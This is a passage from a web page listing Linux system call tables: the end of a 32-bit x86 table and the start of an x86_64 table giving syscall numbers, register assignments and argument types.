dev</td><td>-</td><td>-</td></tr><tr><td>298</td><td>fchownat</td><td>0x12a</td><td>int  dfd</td><td>const  char *filename</td><td>uid_t  user</td><td>gid_t  group</td><td>int  flag</td><td>-</td></tr><tr><td>299</td><td>futimesat</td><td>0x12b</td><td>int  dfd</td><td>const  char *filename</td><td>struct  timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td>300</td><td>fstatat64</td><td>0x12c</td><td>int  dfd</td><td>const  char *filename</td><td>struct  stat64 *statbuf</td><td>int  flag</td><td>-</td><td>-</td></tr><tr><td>301</td><td>unlinkat</td><td>0x12d</td><td>int  dfd</td><td>const  char * pathname</td><td>int  flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td>302</td><td>renameat</td><td>0x12e</td><td>int  olddfd</td><td>const  char * oldname</td><td>int  newdfd</td><td>const  char * newname</td><td>-</td><td>-</td></tr><tr><td>303</td><td>linkat</td><td>0x12f</td><td>int  olddfd</td><td>const  char *oldname</td><td>int  newdfd</td><td>const  char *newname</td><td>int  flags</td><td>-</td></tr><tr><td>304</td><td>symlinkat</td><td>0x130</td><td>const  char * oldname</td><td>int  newdfd</td><td>const  char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td>305</td><td>readlinkat</td><td>0x131</td><td>int  dfd</td><td>const  char *path</td><td>char  *buf</td><td>int  bufsiz</td><td>-</td><td>-</td></tr><tr><td>306</td><td>fchmodat</td><td>0x132</td><td>int  dfd</td><td>const  char * filename</td><td>umode_t  mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>307</td><td>faccessat</td><td>0x133</td><td>int  dfd</td><td>const  char *filename</td><td>int  mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>308</td><td>pselect6</td><td>0x134</td><td>int</td><td>fd_set  *</td><td>fd_set  *</td><td>fd_set  *</td><td>struct  timespec *</td><td>void  *</td></tr><tr><td>309</td><td>ppoll</td><td>0x135</td><td>struct  pollfd *</td><td>unsigned  int</td><td>struct  timespec *</td><td>const  sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td>310</td><td>unshare</td><td>0x136</td><td>unsigned  long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>311</td><td>set_robust_list</td><td>0x137</td><td>struct  robust_list_head *head</td><td>size_t  len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>312</td><td>get_robust_list</td><td>0x138</td><td>int  pid</td><td>struct  robust_list_head * *head_ptr</td><td>size_t  *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td>313</td><td>splice</td><td>0x139</td><td>int  fd_in</td><td>loff_t  *off_in</td><td>int  fd_out</td><td>loff_t  *off_out</td><td>size_t  len</td><td>unsigned  int flags</td></tr><tr><td>314</td><td>sync_file_range</td><td>0x13a</td><td>int  fd</td><td>loff_t  offset</td><td>loff_t  nbytes</td><td>unsigned  int flags</td><td>-</td><td>-</td></tr><tr><td>315</td><td>tee</td><td>0x13b</td><td>int  fdin</td><td>int  fdout</td><td>size_t  len</td><td>unsigned  int flags</td><td>-</td><td>-</td></tr><tr><td>316</td><td>vmsplice</td><td>0x13c</td><td>int  fd</td><td>const  struct iovec *iov</td><td>unsigned  long nr_segs</td><td>unsigned  int flags</td><td>-</td><td>-</td></tr><tr><td>317</td><td>move_pages</td><td>0x13d</td><td>pid_t  pid</td><td>unsigned  long nr_pages</td><td>const  void * *pages</td><td>const  int *nodes</td><td>int  *status</td><td>int  flags</td></tr><tr><td>318</td><td>getcpu</td><td>0x13e</td><td>unsigned  *cpu</td><td>unsigned  *node</td><td>struct  getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td>319</td><td>epoll_pwait</td><td>0x13f</td><td>int  epfd</td><td>struct  epoll_event *events</td><td>int  maxevents</td><td>int  timeout</td><td>const  sigset_t *sigmask</td><td>size_t  sigsetsize</td></tr><tr><td>320</td><td>utimensat</td><td>0x140</td><td>int  dfd</td><td>const  char *filename</td><td>struct  timespec *utimes</td><td>int  flags</td><td>-</td><td>-</td></tr><tr><td>321</td><td>signalfd</td><td>0x141</td><td>int  ufd</td><td>sigset_t  *user_mask</td><td>size_t  sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td>322</td><td>timerfd_create</td><td>0x142</td><td>int  clockid</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>323</td><td>eventfd</td><td>0x143</td><td>unsigned  int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>324</td><td>fallocate</td><td>0x144</td><td>int  fd</td><td>int  mode</td><td>loff_t  offset</td><td>loff_t  len</td><td>-</td><td>-</td></tr><tr><td>325</td><td>timerfd_settime</td><td>0x145</td><td>int  ufd</td><td>int  flags</td><td>const  struct __kernel_itimerspec *utmr</td><td>struct  __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td>326</td><td>timerfd_gettime</td><td>0x146</td><td>int  ufd</td><td>struct  __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>327</td><td>signalfd4</td><td>0x147</td><td>int  ufd</td><td>sigset_t  *user_mask</td><td>size_t  sizemask</td><td>int  flags</td><td>-</td><td>-</td></tr><tr><td>328</td><td>eventfd2</td><td>0x148</td><td>unsigned  int count</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>329</td><td>epoll_create1</td><td>0x149</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>330</td><td>dup3</td><td>0x14a</td><td>unsigned  int oldfd</td><td>unsigned  int newfd</td><td>int  flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>331</td><td>pipe2</td><td>0x14b</td><td>int  *fildes</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>332</td><td>inotify_init1</td><td>0x14c</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>333</td><td>preadv</td><td>0x14d</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>unsigned  long pos_l</td><td>unsigned  long pos_h</td><td>-</td></tr><tr><td>334</td><td>pwritev</td><td>0x14e</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>unsigned  long pos_l</td><td>unsigned  long pos_h</td><td>-</td></tr><tr><td>335</td><td>rt_tgsigqueueinfo</td><td>0x14f</td><td>pid_t  tgid</td><td>pid_t  pid</td><td>int  sig</td><td>siginfo_t  *uinfo</td><td>-</td><td>-</td></tr><tr><td>336</td><td>perf_event_open</td><td>0x150</td><td>struct  perf_event_attr *attr_uptr</td><td>pid_t  pid</td><td>int  cpu</td><td>int  group_fd</td><td>unsigned  long flags</td><td>-</td></tr><tr><td>337</td><td>recvmmsg</td><td>0x151</td><td>int  fd</td><td>struct  mmsghdr *msg</td><td>unsigned  int vlen</td><td>unsigned  flags</td><td>struct  timespec *timeout</td><td>-</td></tr><tr><td>338</td><td>fanotify_init</td><td>0x152</td><td>unsigned  int flags</td><td>unsigned  int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>339</td><td>fanotify_mark</td><td>0x153</td><td>int  fanotify_fd</td><td>unsigned  int flags</td><td>u64  mask</td><td>int  fd</td><td>const  char *pathname</td><td>-</td></tr><tr><td>340</td><td>prlimit64</td><td>0x154</td><td>pid_t  pid</td><td>unsigned  int resource</td><td>const  struct rlimit64 *new_rlim</td><td>struct  rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td>341</td><td>name_to_handle_at</td><td>0x155</td><td>int  dfd</td><td>const  char *name</td><td>struct  file_handle *handle</td><td>int  *mnt_id</td><td>int  flag</td><td>-</td></tr><tr><td>342</td><td>open_by_handle_at</td><td>0x156</td><td>int  mountdirfd</td><td>struct  file_handle *handle</td><td>int  flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>343</td><td>clock_adjtime</td><td>0x157</td><td>clockid_t  which_clock</td><td>struct  timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>344</td><td>syncfs</td><td>0x158</td><td>int  fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>345</td><td>sendmmsg</td><td>0x159</td><td>int  fd</td><td>struct  mmsghdr *msg</td><td>unsigned  int vlen</td><td>unsigned  flags</td><td>-</td><td>-</td></tr><tr><td>346</td><td>setns</td><td>0x15a</td><td>int  fd</td><td>int  nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>347</td><td>process_vm_readv</td><td>0x15b</td><td>pid_t  pid</td><td>const  struct iovec *lvec</td><td>unsigned  long liovcnt</td><td>const  struct iovec *rvec</td><td>unsigned  long riovcnt</td><td>unsigned  long flags</td></tr><tr><td>348</td><td>process_vm_writev</td><td>0x15c</td><td>pid_t  pid</td><td>const  struct iovec *lvec</td><td>unsigned  long liovcnt</td><td>const  struct iovec *rvec</td><td>unsigned  long riovcnt</td><td>unsigned  long flags</td></tr><tr><td>349</td><td>kcmp</td><td>0x15d</td><td>pid_t  pid1</td><td>pid_t  pid2</td><td>int  type</td><td>unsigned  long idx1</td><td>unsigned  long idx2</td><td>-</td></tr><tr><td>350</td><td>finit_module</td><td>0x15e</td><td>int  fd</td><td>const  char *uargs</td><td>int  flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>351</td><td>sched_setattr</td><td>0x15f</td><td>pid_t  pid</td><td>struct  sched_attr *attr</td><td>unsigned  int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>352</td><td>sched_getattr</td><td>0x160</td><td>pid_t  pid</td><td>struct  sched_attr *attr</td><td>unsigned  int size</td><td>unsigned  int flags</td><td>-</td><td>-</td></tr><tr><td>353</td><td>renameat2</td><td>0x161</td><td>int  olddfd</td><td>const  char *oldname</td><td>int  newdfd</td><td>const  char *newname</td><td>unsigned  int flags</td><td>-</td></tr><tr><td>354</td><td>seccomp</td><td>0x162</td><td>unsigned  int op</td><td>unsigned  int flags</td><td>const  char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td>355</td><td>getrandom</td><td>0x163</td><td>char  *buf</td><td>size_t  count</td><td>unsigned  int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>356</td><td>memfd_create</td><td>0x164</td><td>const  char *uname_ptr</td><td>unsigned  int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>357</td><td>bpf</td><td>0x165</td><td>int  cmd</td><td>union  bpf_attr *attr</td><td>unsigned  int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td>358</td><td>execveat</td><td>0x166</td><td>int  dfd</td><td>const  char *filename</td><td>const  char *const *argv</td><td>const  char *const *envp</td><td>int  flags</td><td>-</td></tr><tr><td>359</td><td>socket</td><td>0x167</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>360</td><td>socketpair</td><td>0x168</td><td>int</td><td>int</td><td>int</td><td>int  *</td><td>-</td><td>-</td></tr><tr><td>361</td><td>bind</td><td>0x169</td><td>int</td><td>struct  sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>362</td><td>connect</td><td>0x16a</td><td>int</td><td>struct  sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>363</td><td>listen</td><td>0x16b</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>364</td><td>accept4</td><td>0x16c</td><td>int</td><td>struct  sockaddr *</td><td>int  *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>365</td><td>getsockopt</td><td>0x16d</td><td>int  fd</td><td>int  level</td><td>int  optname</td><td>char  *optval</td><td>int  *optlen</td><td>-</td></tr><tr><td>366</td><td>setsockopt</td><td>0x16e</td><td>int  fd</td><td>int  level</td><td>int  optname</td><td>char  *optval</td><td>int  optlen</td><td>-</td></tr><tr><td>367</td><td>getsockname</td><td>0x16f</td><td>int</td><td>struct  sockaddr *</td><td>int  *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>368</td><td>getpeername</td><td>0x170</td><td>int</td><td>struct  sockaddr *</td><td>int  *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>369</td><td>sendto</td><td>0x171</td><td>int</td><td>void  *</td><td>size_t</td><td>unsigned</td><td>struct  sockaddr *</td><td>int</td></tr><tr><td>370</td><td>sendmsg</td><td>0x172</td><td>int  fd</td><td>struct  user_msghdr *msg</td><td>unsigned  flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>371</td><td>recvfrom</td><td>0x173</td><td>int</td><td>void  *</td><td>size_t</td><td>unsigned</td><td>struct  sockaddr *</td><td>int  *</td></tr><tr><td>372</td><td>recvmsg</td><td>0x174</td><td>int  fd</td><td>struct  user_msghdr *msg</td><td>unsigned  flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>373</td><td>shutdown</td><td>0x175</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>374</td><td>userfaultfd</td><td>0x176</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>375</td><td>membarrier</td><td>0x177</td><td>int  cmd</td><td>int  flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>376</td><td>mlock2</td><td>0x178</td><td>unsigned  long start</td><td>size_t  len</td><td>int  flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td>377</td><td>copy_file_range</td><td>0x179</td><td>int  fd_in</td><td>loff_t  *off_in</td><td>int  fd_out</td><td>loff_t  *off_out</td><td>size_t  len</td><td>unsigned  int flags</td></tr><tr><td>378</td><td>preadv2</td><td>0x17a</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>unsigned  long pos_l</td><td>unsigned  long pos_h</td><td>rwf_t  flags</td></tr><tr><td>379</td><td>pwritev2</td><td>0x17b</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>unsigned  long pos_l</td><td>unsigned  long pos_h</td><td>rwf_t  flags</td></tr><tr><td>380</td><td>pkey_mprotect</td><td>0x17c</td><td>unsigned  long start</td><td>size_t  len</td><td>unsigned  long prot</td><td>int  pkey</td><td>-</td><td>-</td></tr><tr><td>381</td><td>pkey_alloc</td><td>0x17d</td><td>unsigned  long flags</td><td>unsigned  long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>382</td><td>pkey_free</td><td>0x17e</td><td>int  pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>383</td><td>statx</td><td>0x17f</td><td>int  dfd</td><td>const  char *path</td><td>unsigned  flags</td><td>unsigned  mask</td><td>struct  statx *buffer</td><td>-</td></tr><tr><td>384</td><td>arch_prctl</td><td>0x180</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><h1 id="x86-64-Syscall-table"><a href="#x86-64-Syscall-table" class="headerlink" title="x86_64 Syscall table"></a>x86_64 Syscall table</h1><table><thead><tr><th>syscall  number</th><th>syscall</th><th>%rax</th><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%rcx</th><th>%r8</th><th>%r9</th></tr></thead><tbody><tr><td>0</td><td>sys_read</td><td>0x0</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>1</td><td>sys_write</td><td>0x1</td><td>unsigned  int fd</td><td>const  char *buf</td><td>size_t  count</td><td></td><td></td><td></td></tr><tr><td>2</td><td>sys_open</td><td>0x2</td><td>const  char *filename</td><td>int  flags</td><td>int  mode</td><td></td><td></td><td></td></tr><tr><td>3</td><td>sys_close</td><td>0x3</td><td>unsigned  int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>4</td><td>sys_stat</td><td>0x4</td><td>const  char *filename</td><td>struct  stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>5</td><td>sys_fstat</td><td>0x5</td><td>unsigned  int fd</td><td>struct  stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>6</td><td>sys_lstat</td><td>0x6</td><td>fconst  char *filename</td><td>struct  stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>7</td><td>sys_poll</td><td>0x7</td><td>struct  poll_fd *ufds</td><td>unsigned  int nfds</td><td>long  timeout_msecs</td><td></td><td></td><td></td></tr><tr><td>8</td><td>sys_lseek</td><td>0x8</td><td>unsigned  int fd</td><td>off_t  offset</td><td>unsigned  int origin</td><td></td><td></td><td></td></tr><tr><td>9</td><td>sys_mmap</td><td>0x9</td><td>unsigned  long addr</td><td>unsigned  long len</td><td>unsigned  long prot</td><td>unsigned  long flags</td><td>unsigned  long fd</td><td>unsigned  long off</td></tr><tr><td>10</td><td>sys_mprotect</td><td>0xA</td><td>unsigned  long start</td><td>size_t  len</td><td>unsigned  long prot</td><td></td><td></td><td></td></tr><tr><td>11</td><td>sys_munmap</td><td>0xB</td><td>unsigned  long addr</td><td>size_t  len</td><td></td><td></td><td></td><td></td></tr><tr><td>12</td><td>sys_brk</td><td>0xC</td><td>unsigned  long brk</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>13</td><td>sys_rt_sigaction</td><td>0xD</td><td>int  sig</td><td>const  struct sigaction *act</td><td>struct  sigaction *oact</td><td>size_t  sigsetsize</td><td></td><td></td></tr><tr><td>14</td><td>sys_rt_sigprocmask</td><td>0xE</td><td>int  how</td><td>sigset_t  *nset</td><td>sigset_t  *oset</td><td>size_t  sigsetsize</td><td></td><td></td></tr><tr><td>15</td><td>sys_rt_sigreturn</td><td>0xF</td><td>unsigned  long __unused</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>16</td><td>sys_ioctl</td><td>0x10</td><td>unsigned  int fd</td><td>unsigned  int cmd</td><td>unsigned  long arg</td><td></td><td></td><td></td></tr><tr><td>17</td><td>sys_pread64</td><td>0x11</td><td>unsigned  long fd</td><td>char  *buf</td><td>size_t  count</td><td>loff_t  pos</td><td></td><td></td></tr><tr><td>18</td><td>sys_pwrite64</td><td>0x12</td><td>unsigned  int fd</td><td>const  char *buf</td><td>size_t  count</td><td>loff_t  pos</td><td></td><td></td></tr><tr><td>19</td><td>sys_readv</td><td>0x13</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td></td><td></td><td></td></tr><tr><td>20</td><td>sys_writev</td><td>0x14</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td></td><td></td><td></td></tr><tr><td>21</td><td>sys_access</td><td>0x15</td><td>const  char *filename</td><td>int  mode</td><td></td><td></td><td></td><td></td></tr><tr><td>22</td><td>sys_pipe</td><td>0x16</td><td>int  *filedes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>23</td><td>sys_select</td><td>0x17</td><td>int  n</td><td>fd_set  *inp</td><td>fd_set  *outp</td><td>fd_set*exp</td><td>struct  timeval *tvp</td><td></td></tr><tr><td>24</td><td>sys_sched_yield</td><td>0x18</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>25</td><td>sys_mremap</td><td>0x19</td><td>unsigned  long addr</td><td>unsigned  long old_len</td><td>unsigned  long new_len</td><td>unsigned  long flags</td><td>unsigned  long new_addr</td><td></td></tr><tr><td>26</td><td>sys_msync</td><td>0x1A</td><td>unsigned  long start</td><td>size_t  len</td><td>int  flags</td><td></td><td></td><td></td></tr><tr><td>27</td><td>sys_mincore</td><td>0x1B</td><td>unsigned  long start</td><td>size_t  len</td><td>unsigned  char *vec</td><td></td><td></td><td></td></tr><tr><td>28</td><td>sys_madvise</td><td>0x1C</td><td>unsigned  long start</td><td>size_t  len_in</td><td>int  behavior</td><td></td><td></td><td></td></tr><tr><td>29</td><td>sys_shmget</td><td>0x1D</td><td>key_t  key</td><td>size_t  size</td><td>int  shmflg</td><td></td><td></td><td></td></tr><tr><td>30</td><td>sys_shmat</td><td>0x1E</td><td>int  shmid</td><td>char  *shmaddr</td><td>int  shmflg</td><td></td><td></td><td></td></tr><tr><td>31</td><td>sys_shmctl</td><td>0x1F</td><td>int  shmid</td><td>int  cmd</td><td>struct  shmid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>32</td><td>sys_dup</td><td>0x20</td><td>unsigned  int fildes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>33</td><td>sys_dup2</td><td>0x21</td><td>unsigned  int oldfd</td><td>unsigned  int newfd</td><td></td><td></td><td></td><td></td></tr><tr><td>34</td><td>sys_pause</td><td>0x22</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>35</td><td>sys_nanosleep</td><td>0x23</td><td>struct  timespec *rqtp</td><td>struct  timespec *rmtp</td><td></td><td></td><td></td><td></td></tr><tr><td>36</td><td>sys_getitimer</td><td>0x24</td><td>int  which</td><td>struct  itimerval *value</td><td></td><td></td><td></td><td></td></tr><tr><td>37</td><td>sys_alarm</td><td>0x25</td><td>unsigned  int seconds</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>38</td><td>sys_setitimer</td><td>0x26</td><td>int  which</td><td>struct  itimerval *value</td><td>struct  itimerval *ovalue</td><td></td><td></td><td></td></tr><tr><td>39</td><td>sys_getpid</td><td>0x27</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>40</td><td>sys_sendfile</td><td>0x28</td><td>int  out_fd</td><td>int  in_fd</td><td>off_t  *offset</td><td>size_t  count</td><td></td><td></td></tr><tr><td>41</td><td>sys_socket</td><td>0x29</td><td>int  family</td><td>int  type</td><td>int  protocol</td><td></td><td></td><td></td></tr><tr><td>42</td><td>sys_connect</td><td>0x2A</td><td>int  fd</td><td>struct  sockaddr *uservaddr</td><td>int  addrlen</td><td></td><td></td><td></td></tr><tr><td>43</td><td>sys_accept</td><td>0x2B</td><td>int  fd</td><td>struct  sockaddr *upeer_sockaddr</td><td>int  *upeer_addrlen</td><td></td><td></td><td></td></tr><tr><td>44</td><td>sys_sendto</td><td>0x2C</td><td>int  fd</td><td>void  *buff</td><td>size_t  len</td><td>unsigned  flags</td><td>struct  sockaddr *addr</td><td>int  addr_len</td></tr><tr><td>45</td><td>sys_recvfrom</td><td>0x2D</td><td>int  fd</td><td>void  *ubuf</td><td>size_t  size</td><td>unsigned  flags</td><td>struct  sockaddr *addr</td><td>int  *addr_len</td></tr><tr><td>46</td><td>sys_sendmsg</td><td>0x2E</td><td>int  fd</td><td>struct  msghdr *msg</td><td>unsigned  flags</td><td></td><td></td><td></td></tr><tr><td>47</td><td>sys_recvmsg</td><td>0x2F</td><td>int  fd</td><td>struct  msghdr *msg</td><td>unsigned  int flags</td><td></td><td></td><td></td></tr><tr><td>48</td><td>sys_shutdown</td><td>0x30</td><td>int  fd</td><td>int  how</td><td></td><td></td><td></td><td></td></tr><tr><td>49</td><td>sys_bind</td><td>0x31</td><td>int  fd</td><td>struct  sokaddr *umyaddr</td><td>int  addrlen</td><td></td><td></td><td></td></tr><tr><td>50</td><td>sys_listen</td><td>0x32</td><td>int  fd</td><td>int  backlog</td><td></td><td></td><td></td><td></td></tr><tr><td>51</td><td>sys_getsockname</td><td>0x33</td><td>int  fd</td><td>struct  sockaddr *usockaddr</td><td>int  *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>52</td><td>sys_getpeername</td><td>0x34</td><td>int  fd</td><td>struct  sockaddr *usockaddr</td><td>int  *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>53</td><td>sys_socketpair</td><td>0x35</td><td>int  family</td><td>int  type</td><td>int  protocol</td><td>int  *usockvec</td><td></td><td></td></tr><tr><td>54</td><td>sys_setsockopt</td><td>0x36</td><td>int  fd</td><td>int  level</td><td>int  optname</td><td>char  *optval</td><td>int  optlen</td><td></td></tr><tr><td>55</td><td>sys_getsockopt</td><td>0x37</td><td>int  fd</td><td>int  level</td><td>int  optname</td><td>char  *optval</td><td>int  *optlen</td><td></td></tr><tr><td>56</td><td>sys_clone</td><td>0x38</td><td>unsigned  long clone_flags</td><td>unsigned  long newsp</td><td>void  *parent_tid</td><td>void  *child_tid</td><td></td><td></td></tr><tr><td>57</td><td>sys_fork</td><td>0x39</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>58</td><td>sys_vfork</td><td>0x3A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>59</td><td>sys_execve</td><td>0x3B</td><td>const  char *filename</td><td>const  char *const argv[]</td><td>const  char *const envp[]</td><td></td><td></td><td></td></tr><tr><td>60</td><td>sys_exit</td><td>0x3C</td><td>int  error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>61</td><td>sys_wait4</td><td>0x3D</td><td>pid_t  upid</td><td>int  *stat_addr</td><td>int  options</td><td>struct  rusage *ru</td><td></td><td></td></tr><tr><td>62</td><td>sys_kill</td><td>0x3E</td><td>pid_t  pid</td><td>int  sig</td><td></td><td></td><td></td><td></td></tr><tr><td>63</td><td>sys_uname</td><td>0x3F</td><td>struct  old_utsname *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>64</td><td>sys_semget</td><td>0x40</td><td>key_t  key</td><td>int  nsems</td><td>int  semflg</td><td></td><td></td><td></td></tr><tr><td>65</td><td>sys_semop</td><td>0x41</td><td>int  semid</td><td>struct  sembuf *tsops</td><td>unsigned  nsops</td><td></td><td></td><td></td></tr><tr><td>66</td><td>sys_semctl</td><td>0x42</td><td>int  semid</td><td>int  semnum</td><td>int  cmd</td><td>union  semun arg</td><td></td><td></td></tr><tr><td>67</td><td>sys_shmdt</td><td>0x43</td><td>char  *shmaddr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>68</td><td>sys_msgget</td><td>0x44</td><td>key_t  key</td><td>int  msgflg</td><td></td><td></td><td></td><td></td></tr><tr><td>69</td><td>sys_msgsnd</td><td>0x45</td><td>int  msqid</td><td>struct  msgbuf *msgp</td><td>size_t  msgsz</td><td>int  msgflg</td><td></td><td></td></tr><tr><td>70</td><td>sys_msgrcv</td><td>0x46</td><td>int  msqid</td><td>struct  msgbuf *msgp</td><td>size_t  msgsz</td><td>long  msgtyp</td><td>int  msgflg</td><td></td></tr><tr><td>71</td><td>sys_msgctl</td><td>0x47</td><td>int  msqid</td><td>int  cmd</td><td>struct  msqid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>72</td><td>sys_fcntl</td><td>0x48</td><td>unsigned  int fd</td><td>unsigned  int cmd</td><td>unsigned  long arg</td><td></td><td></td><td></td></tr><tr><td>73</td><td>sys_flock</td><td>0x49</td><td>unsigned  int fd</td><td>unsigned  int cmd</td><td></td><td></td><td></td><td></td></tr><tr><td>74</td><td>sys_fsync</td><td>0x4A</td><td>unsigned  int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>75</td><td>sys_fdatasync</td><td>0x4B</td><td>unsigned  int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>76</td><td>sys_truncate</td><td>0x4C</td><td>const  char *path</td><td>long  length</td><td></td><td></td><td></td><td></td></tr><tr><td>77</td><td>sys_ftruncate</td><td>0x4D</td><td>unsigned  int fd</td><td>unsigned  long length</td><td></td><td></td><td></td><td></td></tr><tr><td>78</td><td>sys_getdents</td><td>0x4E</td><td>unsigned  int fd</td><td>struct  linux_dirent *dirent</td><td>unsigned  int count</td><td></td><td></td><td></td></tr><tr><td>79</td><td>sys_getcwd</td><td>0x4F</td><td>char  *buf</td><td>unsigned  long size</td><td></td><td></td><td></td><td></td></tr><tr><td>80</td><td>sys_chdir</td><td>0x50</td><td>const  char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>81</td><td>sys_fchdir</td><td>0x51</td><td>unsigned  int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>82</td><td>sys_rename</td><td>0x52</td><td>const  char *oldname</td><td>const  char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>83</td><td>sys_mkdir</td><td>0x53</td><td>const  char *pathname</td><td>int  mode</td><td></td><td></td><td></td><td></td></tr><tr><td>84</td><td>sys_rmdir</td><td>0x54</td><td>const  char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>85</td><td>sys_creat</td><td>0x55</td><td>const  char *pathname</td><td>int  mode</td><td></td><td></td><td></td><td></td></tr><tr><td>86</td><td>sys_link</td><td>0x56</td><td>const  char *oldname</td><td>const  char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>87</td><td>sys_unlink</td><td>0x57</td><td>const  char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>88</td><td>sys_symlink</td><td>0x58</td><td>const  char *oldname</td><td>const  char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>89</td><td>sys_readlink</td><td>0x59</td><td>const  char *path</td><td>char  *buf</td><td>int  bufsiz</td><td></td><td></td><td></td></tr><tr><td>90</td><td>sys_chmod</td><td>0x5A</td><td>const  char *filename</td><td>mode_t  mode</td><td></td><td></td><td></td><td></td></tr><tr><td>91</td><td>sys_fchmod</td><td>0x5B</td><td>unsigned  int fd</td><td>mode_t  mode</td><td></td><td></td><td></td><td></td></tr><tr><td>92</td><td>sys_chown</td><td>0x5C</td><td>const  char *filename</td><td>uid_t  user</td><td>git_t  group</td><td></td><td></td><td></td></tr><tr><td>93</td><td>sys_fchown</td><td>0x5D</td><td>unsigned  int fd</td><td>uid_t  user</td><td>git_t  group</td><td></td><td></td><td></td></tr><tr><td>94</td><td>sys_lchown</td><td>0x5E</td><td>const  char *filename</td><td>uid_t  user</td><td>git_t  group</td><td></td><td></td><td></td></tr><tr><td>95</td><td>sys_umask</td><td>0x5F</td><td>int  